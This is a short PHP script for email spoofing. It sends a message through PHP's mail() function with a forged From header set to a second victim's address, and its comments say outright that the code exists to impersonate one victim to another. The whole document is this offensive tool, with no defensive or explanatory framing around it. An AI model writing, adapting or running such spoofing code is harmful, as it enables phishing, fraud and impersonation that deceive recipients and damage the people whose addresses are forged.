<?php

$to = "victim1@email.com"; //victim's email to whom you want to send an email

$subject = "email subject";

$message = "your message";

$from = "victim2@email.com"; // victim's email from whom you want to send an email

$headers = "From:" . $from;

$mail = mail($to,$subject,$message,$headers,$from); // this mail() will do our spoofing work

if($mail) 
{
echo "Email sent to ".$to;
}
?>